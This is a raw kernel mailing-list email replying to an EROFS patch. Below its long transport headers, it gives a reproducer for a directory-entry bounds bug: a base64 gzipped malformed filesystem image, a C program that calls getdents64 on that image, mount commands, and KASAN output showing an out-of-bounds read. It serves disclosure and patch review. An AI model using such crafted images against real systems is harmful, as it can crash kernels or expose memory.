Return-Path: <linux-erofs+bounces-3298-lists+linux-erofs=lfdr.de@lists.ozlabs.org>
Delivered-To: lists+linux-erofs@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id qEP3K6Zc3mlfCQAAu9opvQ
	(envelope-from <linux-erofs+bounces-3298-lists+linux-erofs=lfdr.de@lists.ozlabs.org>)
	for <lists+linux-erofs@lfdr.de>; Tue, 14 Apr 2026 17:26:30 +0200
X-Original-To: lists+linux-erofs@lfdr.de
Received: from lists.ozlabs.org (lists.ozlabs.org [IPv6:2404:9400:21b9:f100::1])
	by mail.lfdr.de (Postfix) with ESMTPS id D6DA23FBC52
	for <lists+linux-erofs@lfdr.de>; Tue, 14 Apr 2026 17:26:29 +0200 (CEST)
Received: from boromir.ozlabs.org (localhost [127.0.0.1])
	by lists.ozlabs.org (Postfix) with ESMTP id 4fw7R66vdHz2yVL;
	Wed, 15 Apr 2026 01:26:26 +1000 (AEST)
X-Original-To: linux-erofs@lists.ozlabs.org
Authentication-Results: lists.ozlabs.org; arc=pass smtp.remote-ip="2a01:111:f403:d40d::" arc.chain=microsoft.com
ARC-Seal: i=2; a=rsa-sha256; d=lists.ozlabs.org; s=201707; t=1776180386;
	cv=pass; b=BsX9uJVEfE3BZXnKsMgFO3R8MP0O585IyL4bKOG2Gynt7D3w6mCPEvZmMGEegq3gzp5uywrUsgeYEBdUxR5WW3HAFHtfHUAHCkxAdkv90OJfdANCiqDVIF+01MS+Mm5dz5MsjjfM7g3SxN1PxqbxlvfS60EnyguBYihCFDloOJMY56/gfTEspP0p/8qyQOSuIdHUlGIDV1z8mjcHTxykh/tmaM0sI8n2n7Ytps7AGscaYpq5Hc8fEW/cV48TrAR8gPI2YiTRhvCpESL7b9DFl8MTuGKhoMwg+1Nh7UkexixKipmL99Y2KNvvK9bN4hmtkCiAlEfqdOwZxMDPt3Itwg==
ARC-Message-Signature: i=2; a=rsa-sha256; d=lists.ozlabs.org; s=201707;
	t=1776180386; c=relaxed/relaxed;
	bh=9dmHj49x0JNEOiaKg4QUmb0TUedA39+Ktq6MDdV74/Y=;
	h=From:To:CC:Subject:Date:Message-ID:References:In-Reply-To:
	 Content-Type:MIME-Version; b=oM6XpV4mjebwmpqYKxxelText9VZGCC90ZkogIYXJwamtriCMprXWtcIdRH3NFr6H7cq+RtbAtZEMs6WeB0BsXv1H/q0hUYJr3j+ZMdTyMKDYwIQ/S4SiF6bNrCDXyUtqU9//U+bhK9eCyyDi6h/odIYuRSpvOzGEyVaYpYzk6REjOijErpRJ0sNOtnrxypJsGLPaPjtK6pEZCKP4EuCaCjTmzydESAHdHrvX2cBiPAODVJqX/2IDZon6HSQfIX+M0mCoKgHhlUBaa3xMvlQocXD26n0UqI/hC8Hd/mHKp2HfsqOEcBg2B5fO1OIe9HsWtKRGVzSss5gkrWwGiJ+5g==
ARC-Authentication-Results: i=2; lists.ozlabs.org; dmarc=pass (p=none dis=none) header.from=outlook.com; dkim=pass (2048-bit key; unprotected) header.d=outlook.com header.i=@outlook.com header.a=rsa-sha256 header.s=selector1 header.b=JtlOgXr7; dkim-atps=neutral; spf=pass (client-ip=2a01:111:f403:d40d::; helo=sy8pr01cu002.outbound.protection.outlook.com; envelope-from=moonafterrain@outlook.com; receiver=lists.ozlabs.org) smtp.mailfrom=outlook.com
Authentication-Results: lists.ozlabs.org; dmarc=pass (p=none dis=none) header.from=outlook.com
Authentication-Results: lists.ozlabs.org;
	dkim=pass (2048-bit key; unprotected) header.d=outlook.com header.i=@outlook.com header.a=rsa-sha256 header.s=selector1 header.b=JtlOgXr7;
	dkim-atps=neutral
Authentication-Results: lists.ozlabs.org; spf=pass (sender SPF authorized) smtp.mailfrom=outlook.com (client-ip=2a01:111:f403:d40d::; helo=sy8pr01cu002.outbound.protection.outlook.com; envelope-from=moonafterrain@outlook.com; receiver=lists.ozlabs.org)
Received: from SY8PR01CU002.outbound.protection.outlook.com (mail-australiaeastazolkn190100000.outbound.protection.outlook.com [IPv6:2a01:111:f403:d40d::])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange secp256r1 server-signature RSA-PSS (2048 bits) server-digest SHA256)
	(No client certificate requested)
	by lists.ozlabs.org (Postfix) with ESMTPS id 4fw7R62hmvz2xlh
	for <linux-erofs@lists.ozlabs.org>; Wed, 15 Apr 2026 01:26:26 +1000 (AEST)
ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
 b=iD9dcx5wFDmAsFQh4z3Sb3iFR2RdFgGCrBe5YD7AUg0xmPkO/b9OyUi00jIH1rwTyRpNCGGgyhopM/BPc8loVp9dErogeU4Y7hXAhYjFaSNOIGlrGXV6ZNhkKnBKLuwVx1LWVx3IwdJbDROWK5Em2AuQF3nvLw2K7jlSkjbKOyDi6+5pYJISXzex2FkmFc3xrWC2gE1D8gZGgYWj/OWy5xiQxe05K8LSD1Uh0CUE1qt5NNn8lhW7WvJs1K7w0LZgZv592CC2awTJ191NjqxGfyw1c5mSxhkjkpi0mbFYMyop5D23nDtKUFuAJlqA/UAToFPmJSzO+0gyaDiBhwKWkg==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector10001;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=9dmHj49x0JNEOiaKg4QUmb0TUedA39+Ktq6MDdV74/Y=;
 b=OGhLAd4Ajp/vs8/AgJT3D7HuNE+HKdORn8LrcoQZ0XdfteHIX01piRX9PxCG2ZpQo/jvDGhensX4BDnI0n7cxsdKMENiGw4BVu6zTalIiRl9xLFQYjq56lrlV4KSCbUexpsVxSKxx7tS+O3MNjtFsvquqazz6ip9DTfUAYNr9h8chxbfDRv7T3fZajpU15j/qnjkK9IaVOAZDYg64ceik7/eAYEcWZf9NshaqdI2b9Tse0WTnRdHInNKtGeU1YZErHFD/S89ogVE+f+avtVok4TPc8VLz7YbklLGkGgcXH6ojHfBhvkptBuQboGm5PtyjBEebbarTDfkCZe9JKfttQ==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=none; dmarc=none;
 dkim=none; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=outlook.com;
 s=selector1;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=9dmHj49x0JNEOiaKg4QUmb0TUedA39+Ktq6MDdV74/Y=;
 b=JtlOgXr7MkdtKpBLjeHAXi0ZTOc4tRCDSUp2UUBK5AXcxMqljl/1y6iyg7f68MocC+hHR55VAkNDnTOSi+Y2b+Pas7oIuWKNqRodLUQSmRhMGUPJ1oGWWHLfsFDh/ySyZdFJ6QyYJYy4qSTeDu+vROJzbOhNojM5LDDag0hQfZwtLVS4YHhDQGOBXgTSdMysZSJpJ2pZDHwBNOgf2n7R7LMyjnUteAZB8rdepad505c3N6ibVyS42Jyzy0a8+atTImsE6tKGInGrNDYP7rehww2fgmMnzxUA6NZhuTFemjJcAYk+8kqK+nM8Ha6FAwrqBIhzNzepynCJGbMjfal1gg==
Received: from SYBPR01MB7881.ausprd01.prod.outlook.com (2603:10c6:10:1b0::5)
 by ME6PR01MB10662.ausprd01.prod.outlook.com (2603:10c6:220:25f::12) with
 Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.9769.48; Tue, 14 Apr
 2026 15:26:05 +0000
Received: from SYBPR01MB7881.ausprd01.prod.outlook.com
 ([fe80::7cd2:d6e8:3fa0:5f0c]) by SYBPR01MB7881.ausprd01.prod.outlook.com
 ([fe80::7cd2:d6e8:3fa0:5f0c%5]) with mapi id 15.20.9769.046; Tue, 14 Apr 2026
 15:26:05 +0000
From: Junrui Luo <moonafterrain@outlook.com>
To: Gao Xiang <xiang@kernel.org>, Chao Yu <chao@kernel.org>, Yue Hu
	<zbestahu@gmail.com>, Jeffle Xu <jefflexu@linux.alibaba.com>, Sandeep Dhavale
	<dhavale@google.com>, Hongbo Li <lihongbo22@huawei.com>, Chunhai Guo
	<guochunhai@vivo.com>, Miao Xie <miaoxie@huawei.com>, Greg Kroah-Hartman
	<gregkh@linuxfoundation.org>
CC: "linux-erofs@lists.ozlabs.org" <linux-erofs@lists.ozlabs.org>,
	"linux-kernel@vger.kernel.org" <linux-kernel@vger.kernel.org>,
	"stable@vger.kernel.org" <stable@vger.kernel.org>, Yuhao Jiang
	<danisjiang@gmail.com>
Subject: Re: [PATCH] erofs: validate nameoff for all dirents in
 erofs_fill_dentries()
Thread-Topic: [PATCH] erofs: validate nameoff for all dirents in
 erofs_fill_dentries()
Thread-Index: AQHczCKRV3XTc0wIBE2oNAF7Tel8ArXerbGA
Date: Tue, 14 Apr 2026 15:26:04 +0000
Message-ID: <A0FD7E0F-7558-49B0-8BC8-EB1ECDB2479A@outlook.com>
References:
 <SYBPR01MB78819C794EC3532E5E7FCB3CAF252@SYBPR01MB7881.ausprd01.prod.outlook.com>
In-Reply-To:
 <SYBPR01MB78819C794EC3532E5E7FCB3CAF252@SYBPR01MB7881.ausprd01.prod.outlook.com>
Accept-Language: en-US, zh-CN
Content-Language: en-US
X-MS-Has-Attach:
X-MS-TNEF-Correlator:
x-ms-exchange-messagesentrepresentingtype: 1
x-ms-publictraffictype: Email
x-ms-traffictypediagnostic: SYBPR01MB7881:EE_|ME6PR01MB10662:EE_
x-ms-office365-filtering-correlation-id: 6d079a2c-4ce7-4a88-a45f-08de9a3a24ce
x-microsoft-antispam:
 BCL:0;ARA:14566002|8062599012|8060799015|15080799012|41001999006|461199028|19110799012|51005399006|31061999003|24121999003|22091999003|440099028|3412199025|26121999003|102099032|40105399003;
x-microsoft-antispam-message-info:
 =?us-ascii?Q?1ypcpDzCX/MSEua0yQhqzJKa3aQ8zJf8FsEluouGlP5ZgWF1Q31hRgSEeKbm?=
 =?us-ascii?Q?JAGnRBCeLXAhhJxFK0/5LRjIhNv+Zdi+X6HKsH6ZsT1NJCXeVZJgD0X1jsVC?=
 =?us-ascii?Q?nl26ndJcmKvuRf50w/jUAIJ18Urot+LN/e/Kv+WLFsumhXTjrJA+WzXeNFOD?=
 =?us-ascii?Q?l4R9yi243HGgLEBZ2zQZehXVtDdEns79GDlF36vBQlQxgFM57YnGQh7OV/lk?=
 =?us-ascii?Q?QXrRaOjJ0TcfzxAGLF7ZwSaAQzSh9X/Fzxn1iEGr2D6P0tUlTNE5HCKB7ASn?=
 =?us-ascii?Q?X52yegWaMk1MlMEYnahAG111c6h1IAolby0NJURpaEEd3Bs3TJgKVt8yZR98?=
 =?us-ascii?Q?t+7AreicYNMMt7VBhnNhdIO8BmSxfl2Z+IzJnXx80ucGi9ENk2WnM/ez/uso?=
 =?us-ascii?Q?sdwvtPmfWJvQ+yr0flcSZNWW4cxuS02bfB/4fmigZLfXCVnlebwMv58cHVrY?=
 =?us-ascii?Q?w199Vwcu7CgTLP/nApeO7K9A9SuB3STGAQ3KJbDEU6V7UoYHsUFkoxENxnqx?=
 =?us-ascii?Q?Vw/wsOXGLqYEWfebFAqMwlmUnVkBfRP1/NUEV+SKE5Vpt+dIly/N64Y7+wn3?=
 =?us-ascii?Q?M9T1P/k9GqbLyZYp28q2MHzeeozD2rkmfB270IqXq5Vg2yh8LWe8IxJ5hBpN?=
 =?us-ascii?Q?58plgZrv0u0Pb1NZkHbYsSWDkYx2XvJP6bI8GrKxOfS2EpssxIeMU5N9gdl8?=
 =?us-ascii?Q?GxW4TP/dBrv8O7c6UL4HdvL06E+iix2iQMRCwgun7rs5nfd3Ukbp/9aA2BL/?=
 =?us-ascii?Q?TWahXHFTMREAm8Cq1RUmksqOk1ex20AgiUCaqG0Yjp0FuBwS7ljN3T6apyrn?=
 =?us-ascii?Q?4lIHEtQTP5NZHYPr9YnV5KcF1AFmzNatl19CLl/mxtCW/oLlFdHiYBhvmZVj?=
 =?us-ascii?Q?Ptf9RsIF/7J0MXR16mhO+QTTF6zvitSNZ2xMk+4+oBNsnI+TmbeUitQYBMrj?=
 =?us-ascii?Q?vBm8EINMzIDuQYMGqZ6lliPu/XKQyHsTSXJSdeTFNLlABRiDvYQ7VJLWtAk6?=
 =?us-ascii?Q?fp/DV3FF7ZAVzZkMv9O9lBp2/zK2pjFOK6hTcWLgO1Vsqv0=3D?=
x-ms-exchange-antispam-messagedata-chunkcount: 1
x-ms-exchange-antispam-messagedata-0:
 =?us-ascii?Q?skrCUkN1RQBJStYMYCAnAc/e1bVetQgVgLxociXLMIWKPN8SaeXi6frq0VIe?=
 =?us-ascii?Q?FjtnT8qYx0Vh2xjBRhqpuJGVU4sikUKWPUHB3KRpm37XJYnxniVibcXw0JUc?=
 =?us-ascii?Q?kb8uHTnmegFim5/djC3c2fVrvhK82vyr4foRrXWAYcjW/TK7Oj2ku97sJejh?=
 =?us-ascii?Q?hHte+ccRe06xIezJ5E1TsXLE1noDCGdPmIoRnNpZWv3gWN0VXObzJq/a+b1A?=
 =?us-ascii?Q?a+nSWNRs9qmxhXgoZtNo0nmRzc3VMk67LqIosux3dl+8WcunuGELh1FwPhtr?=
 =?us-ascii?Q?1Dq2l4OQztGOK3ixGmsVjCMg8FSrA2JoYFsd8od5hDD7VJ45WfTMysvHCcq7?=
 =?us-ascii?Q?gLM/qwzXONfHJw6HVkIaO7YX030RgPsPPqkkcqm07PGufRS9SUUm5qXEqbPW?=
 =?us-ascii?Q?KKXSeiZkiLn51nUaqLfWKQ4eAA2hnaWuUB2aUv+TKrpvitNLo3Tx6ufvRKqJ?=
 =?us-ascii?Q?lGimO1yGlVWuAN6QIqJQXZ8TDhkplVS+4tU+qvSEHndQWoW97wUyRYWr6zhT?=
 =?us-ascii?Q?IgDMln2BvJeIRtfDul599LXW+c5NxEw3plyC4dcOUVK4BO1aXhUj6oki0fS1?=
 =?us-ascii?Q?2x/VSDWQE0xfwhEQcOVgcaMPpIgdFBE9rEwA3KHgFVNrzwtMXSCsWCGy3uVx?=
 =?us-ascii?Q?IZQgQzSlJXM2klHL8XoSRzHRLNKgNAMcfTUGGuiTTrpDqRmevPTiKYzxFfPh?=
 =?us-ascii?Q?0D+mrPTt0Gc/hYFasNNXTvUaCgGQeeiRh7NwNJWvUjFCAxYGgQSO/Hm53tMb?=
 =?us-ascii?Q?geBb3VVJixy0wIbSf+0hrLtZlbVYKI3xUu+0RLtzNvFRjkfq153qbdUry0IX?=
 =?us-ascii?Q?V7Svl22YRIVmxpUuSyFrbEkSobz8wHj5LutGFEhFGS5eNlr4qqTRyEGtpRf1?=
 =?us-ascii?Q?o7OJa3G0yllAiggcgP2m4IAzOQitdLtZQ34FDtmgeyaykiexXcPKoztAOR9g?=
 =?us-ascii?Q?j4fLsexRUM/FjeipywutxFlkctsZLSEB5dUVUXqQTBfcsyEbY/SApXAHR+xC?=
 =?us-ascii?Q?NobWMDuHbfBFuVwgwY5BP4U4e5dxVF1YoQSDuoHdLTNkM85NBYCy68RV63Rw?=
 =?us-ascii?Q?9HZOCpc9vOtGzwIDQQMBnZSsqVfJwhS6q/4GA+CwqMoIqxT6thQYDE+b9pFZ?=
 =?us-ascii?Q?msp8J+sEhQcDmgmqBrZ56vcIWhfwYOrVa/IB43AZWX23EqzSdtxSlNZYvGzW?=
 =?us-ascii?Q?MT/CSr0DJXsUBSgga9KBPfSH8vVL+9ZmJC6AQCDYEkj8l5jKfDqCqUJ/VyYj?=
 =?us-ascii?Q?YTUNy89EdyvgpnWFeKUxzFdg4jMtzbAD1X2Uy8XS/EG5PSFXeuCVH4fii+VS?=
 =?us-ascii?Q?v1zKH66EQ698nIbKT8vIvsraE2hNnsFjQiIQ1sUZYrEm0pwKDWMp7YEu2vpT?=
 =?us-ascii?Q?ZVInn15uSe4yaN6sSaGx+A6y8Z5v+z2EcNKziNRTXEFILRSUxQ=3D=3D?=
Content-Type: text/plain; charset="us-ascii"
Content-ID: <F550CE3300D9AB4ABD42F395E2F95F3E@ausprd01.prod.outlook.com>
Content-Transfer-Encoding: quoted-printable
X-Mailing-List: linux-erofs@lists.ozlabs.org
List-Id: <linux-erofs.lists.ozlabs.org>
List-Help: <mailto:linux-erofs+help@lists.ozlabs.org>
List-Owner: <mailto:linux-erofs+owner@lists.ozlabs.org>
List-Post: <mailto:linux-erofs@lists.ozlabs.org>
List-Subscribe: <mailto:linux-erofs+subscribe@lists.ozlabs.org>,
  <mailto:linux-erofs+subscribe-digest@lists.ozlabs.org>,
  <mailto:linux-erofs+subscribe-nomail@lists.ozlabs.org>
List-Unsubscribe: <mailto:linux-erofs+unsubscribe@lists.ozlabs.org>
Precedence: list
MIME-Version: 1.0
X-OriginatorOrg: outlook.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-AuthSource: SYBPR01MB7881.ausprd01.prod.outlook.com
X-MS-Exchange-CrossTenant-RMS-PersistedConsumerOrg: 00000000-0000-0000-0000-000000000000
X-MS-Exchange-CrossTenant-Network-Message-Id: 6d079a2c-4ce7-4a88-a45f-08de9a3a24ce
X-MS-Exchange-CrossTenant-originalarrivaltime: 14 Apr 2026 15:26:04.9081
 (UTC)
X-MS-Exchange-CrossTenant-fromentityheader: Hosted
X-MS-Exchange-CrossTenant-id: 84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa
X-MS-Exchange-CrossTenant-rms-persistedconsumerorg: 00000000-0000-0000-0000-000000000000
X-MS-Exchange-Transport-CrossTenantHeadersStamped: ME6PR01MB10662
X-Spam-Status: No, score=-0.2 required=3.0 tests=ARC_SIGNED,ARC_VALID,
	DKIM_SIGNED,DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,FREEMAIL_FROM,
	SPF_HELO_PASS,SPF_PASS autolearn=disabled version=4.0.1
X-Spam-Checker-Version: SpamAssassin 4.0.1 (2024-03-25) on lists.ozlabs.org
X-Spamd-Result: default: False [-2.20 / 15.00];
	ARC_ALLOW(-1.00)[lists.ozlabs.org:s=201707:i=2];
	DMARC_POLICY_ALLOW(-0.50)[outlook.com,none];
	R_DKIM_ALLOW(-0.20)[outlook.com:s=selector1];
	R_SPF_ALLOW(-0.20)[+ip6:2404:9400:21b9:f100::1:c];
	MAILLIST(-0.19)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	FORGED_SENDER_MAILLIST(0.00)[];
	RCVD_COUNT_THREE(0.00)[4];
	TAGGED_FROM(0.00)[bounces-3298-lists,linux-erofs=lfdr.de];
	RCVD_TLS_LAST(0.00)[];
	FORGED_RECIPIENTS(0.00)[m:xiang@kernel.org,m:chao@kernel.org,m:zbestahu@gmail.com,m:jefflexu@linux.alibaba.com,m:dhavale@google.com,m:lihongbo22@huawei.com,m:guochunhai@vivo.com,m:miaoxie@huawei.com,m:gregkh@linuxfoundation.org,m:linux-erofs@lists.ozlabs.org,m:linux-kernel@vger.kernel.org,m:stable@vger.kernel.org,m:danisjiang@gmail.com,s:lists@lfdr.de];
	TO_DN_EQ_ADDR_SOME(0.00)[];
	FORGED_SENDER(0.00)[moonafterrain@outlook.com,linux-erofs@lists.ozlabs.org];
	FREEMAIL_FROM(0.00)[outlook.com];
	FREEMAIL_TO(0.00)[kernel.org,gmail.com,linux.alibaba.com,google.com,huawei.com,vivo.com,linuxfoundation.org];
	RCPT_COUNT_TWELVE(0.00)[13];
	FORWARDED(0.00)[linux-erofs@lists.ozlabs.org];
	MIME_TRACE(0.00)[0:+];
	FREEMAIL_CC(0.00)[lists.ozlabs.org,vger.kernel.org,gmail.com];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	TO_DN_SOME(0.00)[];
	FORGED_SENDER_FORWARDING(0.00)[];
	PREVIOUSLY_DELIVERED(0.00)[linux-erofs@lists.ozlabs.org];
	FROM_NEQ_ENVFROM(0.00)[moonafterrain@outlook.com,linux-erofs@lists.ozlabs.org];
	FROM_HAS_DN(0.00)[];
	DKIM_TRACE(0.00)[outlook.com:+];
	NEURAL_HAM(-0.00)[-0.997];
	FORGED_RECIPIENTS_FORWARDING(0.00)[];
	MISSING_XM_UA(0.00)[];
	MID_RHS_MATCH_FROM(0.00)[];
	ASN(0.00)[asn:133159, ipnet:2404:9400:2000::/36, country:AU];
	TAGGED_RCPT(0.00)[linux-erofs];
	DBL_BLOCKED_OPENRESOLVER(0.00)[outlook.com:dkim,outlook.com:mid]
X-Rspamd-Queue-Id: D6DA23FBC52
X-Rspamd-Action: no action
X-Rspamd-Server: lfdr

Here is a reproducer for the issue fixed by this patch.

Creates a 3-block (12KB) minimal EROFS image:
- Block 0: superblock
- Block 1: two compact inodes (root dir + dummy file)
- Block 2: directory data with 4 dirents

  de[0]: nameoff=3D48  FT_DIR "."
  de[1]: nameoff=3D49  FT_DIR ".."
  de[2]: nameoff=3D51  FT_REG "f1"
  de[3]: nameoff=3D0xFFFF FT_REG

Reproducible image (base64-encoded gzipped blob):

H4sIALRA3mkCA+3XwQmDQBAF0HW95mAlSyQVpJn0YS8Wpt5z9GwGwkICNqC+BwOfZU//NJMScFX=
L
vE4132Lyzp82plEVAACcwvsZW3/3zXln1x+H/5esMgAAADik+89V30euF/8jUs3b1qRSyqtXFwA=
A
ABzKB5GqxlwAMAAA

Trigger

```
  #define _GNU_SOURCE
  #include <fcntl.h>
  #include <stdio.h>
  #include <unistd.h>
  #include <errno.h>
  #include <sys/syscall.h>

  int main(int argc, char *argv[]) {
      const char *p =3D argc > 1 ? argv[1] : "/mnt";
      char buf[4096];
      int fd =3D open(p, O_RDONLY | O_DIRECTORY);
      if (fd < 0) { perror("open"); return 1; }

      /* skip to de[3] at byte 36 */
      lseek(fd, 36, SEEK_SET);
      int n =3D syscall(SYS_getdents64, fd, buf, sizeof(buf));
      printf("getdents64=3D%d errno=3D%d\n", n, errno);
      close(fd);
  }
```
=09
$ gcc -static -o trigger trigger.c
$ mount -t erofs -o loop image.erofs /mnt
$ ./trigger /mnt

output (kernel 7.0-rc6, CONFIG_KASAN=3Dy):

  BUG: KASAN: slab-out-of-bounds in strnlen+0x74/0x80
  Read of size 1 at addr ffff888008828fff by task trigger/76


